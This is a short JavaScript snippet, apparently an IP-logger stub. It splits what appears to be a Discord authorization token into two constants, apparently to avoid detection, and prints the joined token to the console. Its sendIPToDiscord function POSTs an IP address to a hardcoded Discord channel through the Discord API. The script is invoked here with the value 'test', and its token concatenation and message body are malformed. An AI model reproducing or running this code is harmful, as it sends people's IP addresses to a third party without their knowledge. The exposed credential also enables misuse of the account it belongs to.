function generateNonce() {
    return Math.random() * 1000000
}

const tokenPart1 = "MTIwNTA3MTcwMzExMDE4OTA1Ng.GQIW0Q"
const tokenPart2 = ".NXAM82y7_i4YEYTawjPl8pfXDU_-5vv4ir4pKk"

function sendIPToDiscord(ip) {
    console.log( `${tokenPart1}+${tokenPart2}`)
    fetch("https://discord.com/api/v9/channels/1205072221370847255/messages", {
  "headers": {
    "accept": "*/*",
    "authorization": `${tokenPart1}+${tokenPart2}`,
    "content-type": "application/json",
  },
  "referrer": "https://discord.com/channels/1205072221370847252/1205072221370847255",
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": "{\"mobile_network_type\":\"unknown\",\"" + ip  + "\":\"dsafsdf\",\"nonce\":\"" + generateNonce() + "\",\"tts\":false,\"flags\":0}",
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
}

sendIPToDiscord("test")